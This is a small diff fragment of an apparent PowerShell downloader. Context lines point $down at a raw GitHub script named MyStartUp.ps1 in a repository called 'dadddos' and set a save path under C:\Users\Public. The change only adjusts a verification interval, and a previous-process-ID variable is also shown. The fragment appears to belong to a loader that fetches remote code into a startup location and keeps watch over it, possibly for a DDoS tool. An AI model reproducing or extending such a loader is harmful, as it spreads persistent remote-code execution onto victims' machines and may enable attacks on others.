@@ -3,7 +3,7 @@ $down = "https://raw.githubusercontent.com/fullcaletaxixth/dadddos/main/MyStartU
 
 
 $filePath = "C:\Users\Public\MyStartUp.ps1"
-$verifyInterval = 220
+$verifyInterval = 290
 
 
 $previousPID = $null
